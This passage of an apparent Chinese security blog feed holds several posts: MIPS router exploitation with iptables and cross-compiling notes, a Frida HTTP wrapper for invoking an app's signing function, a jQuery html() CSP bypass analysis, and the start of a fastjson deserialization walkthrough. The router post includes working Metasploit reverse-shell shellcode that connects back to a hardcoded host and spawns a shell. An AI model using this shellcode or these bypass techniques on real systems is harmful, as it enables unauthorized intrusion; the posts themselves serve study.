处理向外发送的数据。<br>FORWARD链 - 将数据转发到本机的其他网卡设备上。</p><p>filter表用来过滤数据包，我们可以在任何时候匹配包并过滤它们。我们就是在这里根据包的内容对包做DROP或者ACCEPT的。当然，我们也可以预先在其他地方做些过滤，但是这个表才是设计用来过滤的。几乎所有的target都可以在这儿使用。</p><h3 id="nat表"><a href="#nat表" class="headerlink" title="nat表"></a>nat表</h3><p>nat表有三种内建链：</p><ul><li>PREROUTING链 - 处理刚到达本机并在路由转发前的数据包。它会转换数据包中的目标IP地址，通常用于DNAT。</li><li>POSTROUTING链 - 处理即将离开本机的数据包。它会转换数据包中的源IP地址，通常用于SNAT。</li><li>OUTPUT链 - 处理本机产生的数据包。</li></ul><p>nat表中的操作有</p><ul><li>DNAT操作主要用在这样一种情况，你有一个合法的IP地址，要把对防火墙的访问重定向到其他的机子上。也就是说，我们改变的是数据包的目标地址，以使包能重路由到某台主机。 </li><li>SNAT改变包的源地址，这极大程度上可以隐藏你的本地网络。一个很好的例子是我们知道防火墙的外部地址，但必须用这个地址替换本地网络地址。如果使用类似192.168.0.0/24这样的地址，是不会从Internet得到任何回应的。 </li><li>MASQUERADE的作用如其名字一样，只是计算机的符合稍微多一点。因为对每个匹配的包，MASQUERADE都要查找可用的IP地址，而不是像SNAT用的IP地址是配置好的。当然，这也有好好处，就是我们可以通过PPP、PPPOE\SLIP等拨号得到的地址，这些地址可能是由ISP的DHCO随机分配的。</li></ul><h3 id="mangle表"><a href="#mangle表" class="headerlink" title="mangle表"></a>mangle表</h3><p>mangle表用于指定如何处理数据包。它能改变TCP头中的QoS位。mangle表具有5个内建链。</p><ul><li>PREROUTING</li><li>OUTPUT</li><li>FORWARD</li><li>INPUT</li><li>POSTROUTING</li></ul><p>mangle表中的操作有</p><ul><li>TOS操作用来设置或改变数据包的服务类型域。这常用来设置网络上的数据包如何被路由等策略。它在Internet上还不能使用，而且很多路由器不会注意到这个域值。 </li><li>TTL操作用来改变数据包的生存时间域，我们可以让所有数据吧只有一个特殊的TTL。可以欺骗一些ISP。 </li><li>MARK用来给包设置特殊的标记。它并不改变包的内容，只是在内核中对相应的包加入标记。</li></ul><p>常用操作<br><code>iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80</code> 把8080端口的流量重定向到路由器的80端口<br><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 1.1.1.1</code> 把80端口的流量重定向到外网ip<code>1.1.1.1</code><br><code>iptables -t nat -F PREROUTING</code> 清除nat表PREROUTING链的内容</p><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://wiki.openwrt.org/doc/howto/netfilter" target="_blank" rel="noopener">https://wiki.openwrt.org/doc/howto/netfilter</a></li><li><a href="https://www.zybuluo.com/yiltoncent/note/82203" target="_blank" rel="noopener">https://www.zybuluo.com/yiltoncent/note/82203</a></li></ul><h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>在路由器能命令执行后，考虑下载并执行自己的payload。首先需要判断cpu的类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">salt@salt:~/rootfs/bin$ readelf -h busybox</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, big endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           MIPS R3000</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x403f80</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          0 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x70001007, noreorder, pic, cpic, o32, mips32r2</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         8</span></span><br><span class="line"><span class="string">  Size of section headers:           0 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         0</span></span><br><span class="line"><span class="string">  Section header string table index: 0</span></span><br></pre></td></tr></table></figure><p>通过readelf可以看出，这个elf对应运行的cpu是32位大端mips架构。因此需要编译的目标架构也如此。</p><h3 id="uclibc"><a href="#uclibc" class="headerlink" title="uclibc"></a>uclibc</h3><p><a href="https://uclibc.org/" target="_blank" rel="noopener">https://uclibc.org/</a> 有现成的交叉编译工具以及启动qemu的脚本。</p><p>可以下载已经编译好的交叉编译工具，也可以直接启动一个qemu虚拟机。</p><h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>手动搭建一套交叉编译的环境。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential bc gettext texinfo patch libncurses5-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/buildroot/buildroot</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>选择对应的cpu架构和toolchain里的kernel headers的版本，make，在<code>buildroot/output/host/usr/bin</code>目录下找到生成的交叉编译工具。</p><h4 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://buildroot.org/download" target="_blank" rel="noopener">https://buildroot.org/download</a></li><li><a href="http://blog.csdn.net/QQ1084283172/article/details/68950682" target="_blank" rel="noopener">http://blog.csdn.net/QQ1084283172/article/details/68950682</a></li></ul><h3 id="docker-交叉编译环境"><a href="#docker-交叉编译环境" class="headerlink" title="docker 交叉编译环境"></a>docker 交叉编译环境</h3><p><a href="https://github.com/dockcross/dockcross" target="_blank" rel="noopener">https://github.com/dockcross/dockcross</a></p><h2 id="编译shellcode"><a href="#编译shellcode" class="headerlink" title="编译shellcode"></a>编译shellcode</h2><p>用metasploit生成反弹shell的shellcode，放在c里编译。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">"\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5\xff\xfd\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x34\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\x35\xce\x11\x5c\xaf\xae\xff\xe4\x3c\x0e\xc0\xa8\x35\xce\x02\x02\xaf\xae\xff\xe6\x27\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x11\xff\xfd\x02\x20\x88\x27\x8f\xa4\xff\xff\x02\x20\x28\x21\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x10\xff\xff\x22\x31\xff\xff\x16\x30\xff\xfa\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ( (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode )();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前编译的时候把shellcode放在了栈上，由于栈的保护机制默认是不能执行的。应该把shellcode放在data段。qemu模拟执行的时候没检查栈不可执行问题，导致模拟执行成功，实际执行失败。</p><p>或者直接用别人编译好的mips二进制文件</p><p><a href="https://github.com/darkerego/mips-binaries/" target="_blank" rel="noopener">https://github.com/darkerego/mips-binaries/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上周huiming和hyperchem大佬带我搞了一发mips的路由器，遇到了一些坑，在这儿做些记录方便以后查看。&lt;/p&gt;
&lt;h2 id=&quot;固件解包&quot;&gt;&lt;a href=&quot;#固件解包&quot; class=&quot;headerlink&quot; title=&quot;固件解包&quot;&gt;&lt;/a&gt;固件解包&lt;/h2&gt;&lt;p&gt;用binwalk分离文件然后用对应的文件系统解包工具解开。&lt;/p&gt;
&lt;p&gt;osx上可以使用 &lt;a href=&quot;https://github.com/cinquemb/firmware-mod-kit-osx&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/cinquemb/firmware-mod-kit-osx&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://5alt.me/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>我是如何用Hrida自动生成签名的</title>
    <link href="http://5alt.me/2017/11/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8hrida%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E7%AD%BE%E5%90%8D%E7%9A%84/"/>
    <id>http://5alt.me/2017/11/我是如何用hrida自动生成签名的/</id>
    <published>2017-11-08T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.787Z</updated>
    
    <content type="html"><![CDATA[<p>这应该是最后一次写用<code>frida</code>来hook安卓的东西了 = = 当然，最主要的目的还是为这个小脚本打个广告。</p><p>这次的小玩意叫<a href="https://github.com/5alt/hrida" target="_blank" rel="noopener">Hrida</a>，思路来自于<a href="https://github.com/federicodotta/Brida/" target="_blank" rel="noopener">Brida</a>。<code>Hrida</code>可以看作是<code>frida</code>的http接口，可以通过http请求获取在frida脚本中导出函数的执行结果。</p><p><code>Hrida</code>的用法见<a href="https://github.com/5alt/hrida" target="_blank" rel="noopener">Github页面</a>。<br><a id="more"></a><br>在检测一个APK的时候，发现一些关键请求带了签名，找来找去没有找到签名算法所在的问题，只找到了调用签名函数在java层的接口。这个接口的参数是一些自定义类型的类。目标是随意调用签名函数为自己的请求进行签名。</p><p>最开始以为frida只是一个hook工具，只能在apk里某些函数被调用的时候触发，后来想到了<code>Brida</code>，翻了翻源码和文档，发现<code>frida</code>提供了rpc的接口。通过这些接口可以方便的导出一些函数，供外部调用，而且是任意时候都能调用。在这些函数内部我们可以使用任意Java类，实例化我们想要的对象，调用特定的方法。</p><p>我们为了调用签名函数，首先需要实例化对应的类和参数。对于自定义的类，实例化的时候可能需要一层一层向前追溯。<br>我尝试过先用hook的方式来保存一个目标类的对象的引用，然后在导出函数里使用，实践下来发现frida报了上下文环境的异常。于是只能老老实实自己构造了。</p><p>样例代码如下所示，导出了一个叫<code>sign</code>的函数，参数是<code>data</code>，其中参数以json中数组的形式传递。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rpc.js</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">sign: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">Hrida = Java.use(<span class="string">'me.5alt.hrida'</span>)</span><br><span class="line">hrida = Hrida.$<span class="keyword">new</span>();</span><br><span class="line">result = hrida.sign(data).toString()</span><br><span class="line"><span class="built_in">console</span>.log(result)</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(e)</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用<code>Hrida</code>载入：<code>python hrida.py -a me.5alt rpc.js</code>。</p><p>用python调用这个接口<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:8800/call"</span></span><br><span class="line">method = <span class="string">'sign'</span></span><br><span class="line">args = [<span class="string">"md5_salt"</span>]</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'method'</span>: method,</span><br><span class="line">    <span class="string">'args'</span>: quote(json.dumps(args))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url, data=payload).text</span><br></pre></td></tr></table></figure></p><p>为了方便调用，可以在本地装一个安卓虚拟机，启动<code>Hrida</code>，用<code>autossh</code>将本地监听的端口反弹到远程vps上，这样就能在公网愉快的使用了。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/5alt/hrida" target="_blank" rel="noopener">https://github.com/5alt/hrida</a></p><p><a href="http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" target="_blank" rel="noopener">http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这应该是最后一次写用&lt;code&gt;frida&lt;/code&gt;来hook安卓的东西了 = = 当然，最主要的目的还是为这个小脚本打个广告。&lt;/p&gt;
&lt;p&gt;这次的小玩意叫&lt;a href=&quot;https://github.com/5alt/hrida&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hrida&lt;/a&gt;，思路来自于&lt;a href=&quot;https://github.com/federicodotta/Brida/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Brida&lt;/a&gt;。&lt;code&gt;Hrida&lt;/code&gt;可以看作是&lt;code&gt;frida&lt;/code&gt;的http接口，可以通过http请求获取在frida脚本中导出函数的执行结果。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Hrida&lt;/code&gt;的用法见&lt;a href=&quot;https://github.com/5alt/hrida&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Github页面&lt;/a&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="Android" scheme="http://5alt.me/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>jQuery里的html()</title>
    <link href="http://5alt.me/2017/09/jQuery%E9%87%8C%E7%9A%84html()/"/>
    <id>http://5alt.me/2017/09/jQuery里的html()/</id>
    <published>2017-09-25T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>在看一个浏览器插件，发现可以在插件内部的页面中插入任意的 html 标签，但是由于 CSP 的限制，只能<code>script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;self&#39;</code>，并不支持<code>unsafe-inline</code>。</p><p>出现问题部分的代码为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g.html(<span class="string">'&lt;iframe src="'</span> + a.url + <span class="string">"?id="</span> + a.id <span class="string">'" frameborder="0" scrolling="no"&gt;&lt;/iframe&gt;'</span>).show()</span><br></pre></td></tr></table></figure></p><p>其中 a.url 和 a.id 没有过滤可以完全控制。思路很简单，闭合 iframe 标签插入新的标签即可。在测试的时候发现，利用 img 标签的 onerror 事件就会引发 CSP 的报警，而用 script 标签则不会。一脸懵逼。</p><p>本地搭建环境，引用最新的 jQuery 库（3.2.1），用同样的方法却发现无论 img 还是 script 标签都会触发 CSP 的报警。两脸懵逼。</p><p>问过大佬，大佬说 jQuery 的<code>.html</code>方法调用的是 eval，而 CSP 中允许了 unsafe-eval，所以能执行 JavaScript。三脸懵逼。<br><a id="more"></a><br>从原版插件中找到 jQuery，版本号为 1.8.0，在 jQuery 中搜索 eval 函数的使用，发现只有在 globalEval 中被调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">globalEval: <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">    b &amp;&amp; aa.test(b) &amp;&amp; (a.execScript || <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">        a.eval.call(a, b)</span><br><span class="line">    &#125;)(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然会调用 eval，那么就在 globalEval 函数中打一下 call stack 吧。在 eval 前插入 <code>console.log(new Error().stack);</code>。得到函数调用栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Function.globalEval</span><br><span class="line">HTMLScriptElement.&lt;anonymous&gt;</span><br><span class="line">Function.each</span><br><span class="line">$.domManip</span><br><span class="line">$.append</span><br><span class="line">$.&lt;anonymous&gt;</span><br><span class="line">Function.access</span><br><span class="line">$.html</span><br><span class="line">&lt;anonymous&gt;</span><br></pre></td></tr></table></figure><p>函数一直追踪过去可以看到，原来jQuery 的<code>.html</code>方法并不是 <code>innerHTML</code> 这么简单，在这个函数里做了一些判断，会对<code>Ua = /&lt;(?:script|style|link)/i</code>这样的标签进行特殊处理。如果是 script 标签会将内容 eval 执行，导致 CSP 的保护被绕过。</p><p>那么为什么最新版的 jQuery 就不存在这个问题了呢？翻了翻源码可以发现，最新版的 globalEval 函数已经变成了在 head 里 append 一个script 标签等 JavaScript 执行完之后删除。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">globalEval: <span class="function"><span class="keyword">function</span>(<span class="params"> code </span>) </span>&#123;</span><br><span class="line">    DOMEval( code );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DOMEval</span>(<span class="params"> code, doc </span>) </span>&#123;</span><br><span class="line">    doc = doc || <span class="built_in">document</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> script = doc.createElement( <span class="string">"script"</span> );</span><br><span class="line"></span><br><span class="line">    script.text = code;</span><br><span class="line">    doc.head.appendChild( script ).parentNode.removeChild( script );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样由于不是通过 eval 的方式执行 JavaScript，受到 CSP 的保护。</p><p>jQuery 中关于 globalEval 这个函数的变化也是挺有意思的。在 github 上翻了翻 commit 的历史记录。</p><p>在<a href="https://github.com/jquery/jquery/commit/feea9394b75a5dcb16fad013a402b388f97cefba" target="_blank" rel="noopener">2013年4月3日的一次commit</a>把 globalEval 从 eval 变成了插 script 标签的方式。<br>而在<a href="https://github.com/jquery/jquery/blob/6b938e1c162877ee62681f8aefe6f64ba208eead/src/core.js#L629" target="_blank" rel="noopener">09年的某次commit</a>就曾经是插 script 标签的方式。</p><p>这中间到底发生了什么 =。=</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在看一个浏览器插件，发现可以在插件内部的页面中插入任意的 html 标签，但是由于 CSP 的限制，只能&lt;code&gt;script-src &amp;#39;self&amp;#39; &amp;#39;unsafe-eval&amp;#39;; object-src &amp;#39;self&amp;#39;&lt;/code&gt;，并不支持&lt;code&gt;unsafe-inline&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;出现问题部分的代码为&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;g.html(&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;iframe src=&quot;&#39;&lt;/span&gt; + a.url + &lt;span class=&quot;string&quot;&gt;&quot;?id=&quot;&lt;/span&gt; + a.id &lt;span class=&quot;string&quot;&gt;&#39;&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;&lt;/span&gt;).show()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中 a.url 和 a.id 没有过滤可以完全控制。思路很简单，闭合 iframe 标签插入新的标签即可。在测试的时候发现，利用 img 标签的 onerror 事件就会引发 CSP 的报警，而用 script 标签则不会。一脸懵逼。&lt;/p&gt;
&lt;p&gt;本地搭建环境，引用最新的 jQuery 库（3.2.1），用同样的方法却发现无论 img 还是 script 标签都会触发 CSP 的报警。两脸懵逼。&lt;/p&gt;
&lt;p&gt;问过大佬，大佬说 jQuery 的&lt;code&gt;.html&lt;/code&gt;方法调用的是 eval，而 CSP 中允许了 unsafe-eval，所以能执行 JavaScript。三脸懵逼。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>fastjson 调试利用记录</title>
    <link href="http://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>http://5alt.me/2017/09/fastjson调试利用记录/</id>
    <published>2017-09-05T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。<br>之前从来没搞过java，于是拉着雨对着<code>Ricter</code>的博客一起跟了一遍流程，带我学习了一波。<br><a id="more"></a></p><h2 id="fastjson-解析过程"><a href="#fastjson-解析过程" class="headerlink" title="fastjson 解析过程"></a>fastjson 解析过程</h2><p>跟了一遍 fastjson。对代码细节不关心的同学，可以直接跳过这个过程。</p><p>从 JSON.parse 开始，把PoC作为输入，F7一路跟下去，可以看到 fastjson 的解析过程。</p><p>我们输入的第一个字符为<code>{</code>，这表示解析出来的结果是一个 Object。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public Object parse(Object fieldName)</span></span><br><span class="line"><span class="keyword">case</span> LBRACE:</span><br><span class="line">    JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.parseObject((Map)object, fieldName);</span><br></pre></td></tr></table></figure></p><p>在这里调用了<code>parseObject</code>来继续解析。</p><p>首先遇到的是第一个key<code>@type</code>，然后进行了以下的判断，如果是<code>@type</code>并且启用了特殊key检查的话，那么就把对应的value作为类来加载。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/DefaultJSONParser.java:public final Object parseObject(final Map object, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    ...</span><br><span class="line">    ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">    <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在加载这个类的时候比较复杂，如果是java里常见的基本类型就直接新建一个对应的实例，fastjson里也内置了一些常见类的反序列化方法。由于现在我们的类并不常见，也不在内置的黑名单里，于是最终调用了<code>createJavaBeanDeserializer</code>来进行反序列化。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/ParserConfig.java:public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type)</span></span><br><span class="line"><span class="keyword">if</span> (type <span class="keyword">instanceof</span> WildcardType || type <span class="keyword">instanceof</span> TypeVariable || type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">String className = clazz.getName();</span><br><span class="line">className = className.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123; <span class="comment">//黑名单检查</span></span><br><span class="line">    String deny = denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parser deny : "</span> + className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line"><span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line"><span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br></pre></td></tr></table></figure></p><p>在<code>JavaBeanDeserializer</code>的构造函数里，我们发现调用了<code>JavaBeanInfo.build</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:public JavaBeanDeserializer(ParserConfig config, Class&lt;?&gt; clazz, Type type)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JavaBeanDeserializer</span><span class="params">(ParserConfig config, Class&lt;?&gt; clazz, Type type)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));</span><br><span 